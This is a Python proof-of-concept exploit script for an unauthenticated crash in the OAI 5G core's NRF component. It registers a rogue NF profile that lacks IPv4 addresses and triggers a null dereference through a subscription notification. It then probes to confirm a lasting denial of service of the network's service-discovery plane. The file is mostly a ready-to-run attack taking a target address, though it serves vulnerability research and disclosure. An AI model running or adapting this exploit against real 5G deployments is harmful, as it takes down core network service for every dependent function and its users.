#!/usr/bin/env python3
"""
OAI CN5G NRF (oai-cn5g-nrf) -- unauthenticated SIGSEGV (CWE-125/CWE-824)
in nrf_client::notify_subscribed_event() via an NFProfile that carries no
`ipv4Addresses`.

Root cause (src/nrf_app/nrf_client.cpp:36-40):

    std::vector<struct in_addr> instance_addrs = {};
    profile.get()->get_nf_ipv4_addresses(instance_addrs);
    // TODO: use the first IPv4 addr for now
    std::string instance_uri =
        std::string(inet_ntoa(*((struct in_addr*) &(instance_addrs[0]))));

`get_nf_ipv4_addresses()` (src/nrf_app/nrf_profile.cpp:204-206) is a bare
`a = ipv4_addresses;` with no size check, and the producer side
(src/common/api_conversions.cpp:88) only fills the vector when the client
supplied the OPTIONAL `ipv4Addresses` member:

    if (api_profile.ipv4AddressesIsSet()) { ... add_nf_ipv4_addresses(addr4); }

3GPP TS 29.510 makes `ipv4Addresses` optional in NFProfile, so a profile
registered without it leaves `instance_addrs` EMPTY.  `instance_addrs[0]` on an
empty std::vector returns `*nullptr`; `inet_ntoa()` then dereferences it ->
`SIGSEGV`, `segfault at 0`, container exit code 139.

Two unauthenticated triggers exist:

  path=subscribe (nrf_app.cpp:500-513)
     PUT  /nnrf-nfm/v1/nf-instances/{uuid}   <- rogue profile, NO ipv4Addresses
     POST /nnrf-nfm/v1/subscriptions         <- reqNotifEvents=[NF_REGISTERED]
     handle_create_subscription() immediately iterates every already-registered
     profile matching subscrCond and calls notify_subscribed_event() on each.

  path=register (nrf_app.cpp:1150-1170)
     POST /nnrf-nfm/v1/subscriptions         <- subscription first
     PUT  /nnrf-nfm/v1/nf-instances/{uuid}   <- then the rogue profile
     handle_register_nf_instance() ends with m_event_sub.nf_status_registered()
     -> handle_nf_status_registered() -> notify_subscribed_event().

WHY nfType MUST BE ONE OF {AMF,SMF,UPF,AUSF,UDM,UDR,PCF}
---------------------------------------------------------
`api_conv::profile_api_to_nrf_profile()` only calls `set_nf_type()` inside the
seven case labels listed above (src/common/api_conversions.cpp:134,162,189,
290,317,384,442); the `default:` arm at :485 is EMPTY.  A profile registered
as NSSF/NEF/LMF/SMSF/GMLC/5G_EIR/SEPP/N3IWF/AF/UDSF/BSF/CHF/NWDAF therefore
keeps `nf_type == NF_TYPE_UNKNOWN` and is echoed back by the NRF as
`"nfType":"NF TYPE UNKNOWN"` -- a second, independent defect (NF-type
confusion) that also makes such a profile unmatchable by any NF_TYPE_COND
subscription.  Use PCF (not deployed by environments/oai/basic-nrf.yaml) so
the rogue profile is the ONLY match and the crash is deterministic.

Neither the HTTP/2 route handler (src/api-server/nrf-http2-server.cpp:119-132
catch(std::exception&)) nor the ITTI dispatch loop can intercept a hardware
fault, so the whole NRF process dies.  Because the NRF is the SBI discovery
root of trust, every other NF loses service discovery until it is restarted.

Usage:
    python3 nrf_empty_ipv4_sigsegv_poc.py --target 172.30.0.4 --port 8080
    python3 nrf_empty_ipv4_sigsegv_poc.py --target <ip> --path subscribe
    python3 nrf_empty_ipv4_sigsegv_poc.py --target <ip> --mode control

Requires only Python 3 + the `h2` package (HTTP/2 cleartext, prior knowledge).
"""

import argparse
import json
import socket
import sys
import time
import uuid

try:
    import h2.config
    import h2.connection
    import h2.events
except ImportError:
    sys.exit("ERROR: the 'h2' package is required (pip3 install h2)")

BASE = "/nnrf-nfm/v1"


# --------------------------------------------------------------------------
# minimal h2c (prior-knowledge) client
# --------------------------------------------------------------------------
def h2c_request(host, port, method, path, body=None, timeout=15):
    """Return (status, body_bytes, elapsed).  Never raises on RST/EOF."""
    t0 = time.time()
    try:
        s = socket.create_connection((host, port), timeout=timeout)
    except OSError as e:
        return ("CONN-FAIL:%s" % e), b"", time.time() - t0
    s.settimeout(timeout)
    cfg = h2.config.H2Configuration(client_side=True, header_encoding="utf-8")
    conn = h2.connection.H2Connection(config=cfg)
    conn.initiate_connection()
    try:
        s.sendall(conn.data_to_send())
    except OSError as e:
        s.close()
        return ("SEND-FAIL:%s" % e), b"", time.time() - t0

    payload = b""
    headers = [
        (":method", method),
        (":scheme", "http"),
        (":path", path),
        (":authority", "%s:%d" % (host, port)),
        ("user-agent", "nrf-sigsegv-poc"),
        ("accept", "application/json"),
    ]
    if body is not None:
        payload = json.dumps(body).encode()
        headers.append(("content-type", "application/json"))
        headers.append(("content-length", str(len(payload))))
    try:
        conn.send_headers(1, headers, end_stream=(payload == b""))
        if payload:
            conn.send_data(1, payload, end_stream=True)
        s.sendall(conn.data_to_send())
    except OSError as e:
        s.close()
        return ("SEND-FAIL:%s" % e), b"", time.time() - t0

    status, rbody, done = None, b"", False
    while not done and (time.time() - t0) < timeout:
        try:
            data = s.recv(65535)
        except socket.timeout:
            break
        except OSError:
            break
        if not data:
            break
        try:
            events = conn.receive_data(data)
        except Exception:
            break
        for ev in events:
            if isinstance(ev, h2.events.ResponseReceived):
                for k, v in ev.headers:
                    if k == ":status":
                        status = v
            elif isinstance(ev, h2.events.DataReceived):
                rbody += ev.data
                conn.acknowledge_received_data(
                    ev.flow_controlled_length, ev.stream_id
                )
            elif isinstance(ev, (h2.events.StreamEnded, h2.events.StreamReset)):
                done = True
        try:
            s.sendall(conn.data_to_send())
        except OSError:
            break
    elapsed = time.time() - t0
    try:
        s.close()
    except OSError:
        pass
    if status is None:
        status = "NO-RESPONSE(stream killed)"
    return status, rbody, elapsed


def show(label, status, body, elapsed, limit=200):
    txt = ""
    if body:
        try:
            txt = json.dumps(json.loads(body), sort_keys=True)[:limit]
        except Exception:
            txt = body.decode("utf-8", "replace")[:limit]
    print("  [%-14s] HTTP %-28s %6.3fs  %s" % (label, status, elapsed, txt))
    return status


def register_nf(host, port, nf_type, with_ipv4, instance_id=None):
    iid = instance_id or str(uuid.uuid4())
    profile = {
        "nfInstanceId": iid,
        "nfInstanceName": "rogue-%s" % nf_type.lower(),
        "nfType": nf_type,
        "nfStatus": "REGISTERED",
        "fqdn": "rogue-%s.oai.local" % nf_type.lower(),
        "heartBeatTimer": 10,
    }
    if with_ipv4:
        profile["ipv4Addresses"] = ["172.30.0.99"]
    st, bd, el = h2c_request(
        host, port, "PUT", "%s/nf-instances/%s" % (BASE, iid), profile
    )
    return show("PUT %s%s" % (nf_type, "" if with_ipv4 else "/no-ip"), st, bd, el), iid


def subscribe(host, port, nf_type, uri="http://172.30.0.1:9/"):
    sub = {
        "nfStatusNotificationUri": uri,
        "reqNotifEvents": ["NF_REGISTERED"],
        "subscrCond": {"nfType": nf_type},
    }
    st, bd, el = h2c_request(host, port, "POST", "%s/subscriptions" % BASE, sub)
    return show("POST sub %s" % nf_type, st, bd, el)


def alive(host, port):
    """Probe with a harmless GET of the NRF's own discovery endpoint."""
    st, _, el = h2c_request(host, port, "GET", "%s/nf-instances" % BASE, timeout=8)
    return (isinstance(st, str) and st.isdigit()), st, el


# remembers whether run_control() already created a subscription for a type,
# so run_attack(path="register") can reuse it and keep the two phases
# byte-identical apart from the missing ipv4Addresses member.
SUBSCRIBED = {}


# --------------------------------------------------------------------------
def run_control(t, p, nf_type="PCF"):
    """DIFFERENTIAL control: identical request sequence, only difference is
    that the NFProfile DOES carry the optional `ipv4Addresses` member.

    Order matters: the subscription is created FIRST so that the very next
    NF registration goes through
        handle_register_nf_instance -> nf_status_registered
        -> handle_nf_status_registered -> get_subscription_list (match)
        -> nrf_client::notify_subscribed_event
    i.e. the SAME function that crashes in the attack, but with a non-empty
    `instance_addrs`.  The NRF must survive and must log
    "NF instance URI: <the address we supplied>" (nrf_client.cpp:41).
    """
    print("[*] CONTROL -- same path, NFProfile WITH ipv4Addresses")
    print("    step 1: subscribe to NF_REGISTERED for %s" % nf_type)
    subscribe(t, p, nf_type)
    SUBSCRIBED[nf_type] = True
    time.sleep(1.0)
    print("    step 2: register a benign %s profile WITH ipv4Addresses" % nf_type)
    register_nf(t, p, nf_type, with_ipv4=True)
    time.sleep(2.0)
    ok, st, el = alive(t, p)
    print("    => NRF survived the control sequence: %s (probe=%s)" % ("YES" if ok else "NO", st))
    print("    => verify in the NRF log that 'NF instance URI: 172.30.0.99'")
    print("       was printed, proving notify_subscribed_event() was entered")
    return ok


def run_attack(t, p, path="register", nf_type="PCF"):
    print("\n[*] ATTACK -- NFProfile WITHOUT ipv4Addresses (trigger=%s)" % path)
    if path == "subscribe":
        print("    step 1: plant rogue %s profile (no ipv4Addresses)" % nf_type)
        register_nf(t, p, nf_type, with_ipv4=False)
        time.sleep(1.0)
        ok0, _, _ = alive(t, p)
        print("    NRF alive before the triggering request: %s" % ok0)
        print("    step 2: POST /subscriptions reqNotifEvents=[NF_REGISTERED]"
              " subscrCond.nfType=%s" % nf_type)
        print("    --> this single unauthenticated request is the crash")
        subscribe(t, p, nf_type)
    else:
        if not SUBSCRIBED.get(nf_type):
            print("    step 1: subscribe to NF_REGISTERED for %s" % nf_type)
            subscribe(t, p, nf_type)
            time.sleep(1.0)
        else:
            print("    step 1: reusing the %s subscription created by the"
                  " control phase" % nf_type)
        ok0, _, _ = alive(t, p)
        print("    NRF alive before the triggering request: %s" % ok0)
        print("    step 2: register a rogue %s profile with NO ipv4Addresses"
              % nf_type)
        print("    --> this single unauthenticated PUT is the crash; it is")
        print("        byte-for-byte the control request minus one OPTIONAL")
        print("        3GPP TS 29.510 NFProfile member")
        register_nf(t, p, nf_type, with_ipv4=False)

    # poll: the NRF has no restart policy in basic-nrf.yaml, so a SIGSEGV is
    # permanent until an operator intervenes.  Keep probing anyway to record
    # how long the SBI discovery plane stays down.
    print("\n[*] POST-CRASH PROBING (12 x 3s)")
    dead_since = None
    for i in range(12):
        time.sleep(3)
        ok, st, el = alive(t, p)
        print("    t+%02ds probe -> %s" % ((i + 1) * 3, st))
        if not ok and dead_since is None:
            dead_since = (i + 1) * 3
        if ok and dead_since is not None:
            print("    => NRF answering again at t+%ds (an operator or a"
                  " restart policy brought it back)" % ((i + 1) * 3))
            return True
    if dead_since is not None:
        print("    => NRF UNREACHABLE for >= %ds and did not come back on its"
              " own -- permanent DoS of the SBI discovery plane"
              % dead_since)
    return dead_since is not None


def main():
    ap = argparse.ArgumentParser(description="OAI CN5G NRF SIGSEGV PoC")
    ap.add_argument("--target", required=True, help="NRF IP or hostname")
    ap.add_argument("--port", type=int, default=8080, help="NRF SBI port")
    ap.add_argument("--mode", default="all", choices=["all", "control", "attack"])
    ap.add_argument("--path", default="register", choices=["subscribe", "register"])
    ap.add_argument("--nf-type", default="PCF",
                    help="nfType for the rogue profile. MUST be one of "
                         "AMF/SMF/UPF/AUSF/UDM/UDR/PCF (see module docstring). "
                         "Default PCF: handled by profile_api_to_nrf_profile "
                         "yet not deployed by basic-nrf.yaml, so the rogue "
                         "profile is the only NF_TYPE_COND match and the crash "
                         "is deterministic.")
    a = ap.parse_args()

    print("OAI CN5G NRF unauthenticated SIGSEGV PoC")
    print("  target = %s:%d   mode = %s   path = %s   nfType = %s"
          % (a.target, a.port, a.mode, a.path, a.nf_type))
    print("  sink   = src/nrf_app/nrf_client.cpp:36-40  instance_addrs[0]")
    print("-" * 76)

    ok, st, el = alive(a.target, a.port)
    print("[*] PRE-FLIGHT NRF probe: %s" % st)
    if not ok:
        sys.exit("ERROR: NRF not reachable at %s:%d -- deploy the stack first"
                 % (a.target, a.port))

    if a.mode in ("all", "control"):
        if not run_control(a.target, a.port):
            print("!! control sequence already killed the NRF -- aborting")
            sys.exit(2)
    if a.mode in ("all", "attack"):
        crashed = run_attack(a.target, a.port, a.path, a.nf_type)
        print("\n[*] VERDICT: NRF crashed = %s" % crashed)
    print("-" * 76)
    print("Done. Check `docker inspect oai-nrf` for ExitCode 139 and the host")
    print("kernel log for: nrf[...] segfault at 0 ip ... error 4")


if __name__ == "__main__":
    main()
